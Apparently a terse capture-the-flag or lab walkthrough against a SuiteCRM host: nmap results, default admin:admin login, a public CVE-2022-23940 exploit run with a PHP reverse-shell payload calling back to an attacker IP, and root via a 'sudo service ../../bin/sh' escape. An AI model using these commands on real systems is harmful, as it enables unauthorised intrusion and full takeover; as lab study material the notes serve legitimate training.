____

> [!info]
> IP=192.168.190.146

# Nmap
| PORT | STATE | SERVICE |
| ---- | ---- | ---- |
| 22/tcp | open | ssh |
| 80/tcp | open | http |
| 3306/tcp | open | mysql |
| 33060/tcp | open | mysqlx |

```python
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)
|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)
|_  256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.38 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/
| http-title: SuiteCRM
|_Requested resource was index.php?action=Login&module=Users
3306/tcp  open  mysql   MySQL (unauthorized)
33060/tcp open  mysqlx?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=2/1%Time=65BC56A7%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
```
# 80 - http
admin:admin

- suitecrm
https://github.com/manuelz120/CVE-2022-23940

```bash
./exploit.py -h http://192.168.190.146 -u admin -p admin --payload "php -r '\$sock=fsockopen(\"192.168.45.180\", 4444); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
```


# PrivEsc

```bash
sudo -l

User www-data may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/service

sudo service ../../bin/sh
```


find / -type f -name "*.txt" -o ! -name "*.*"
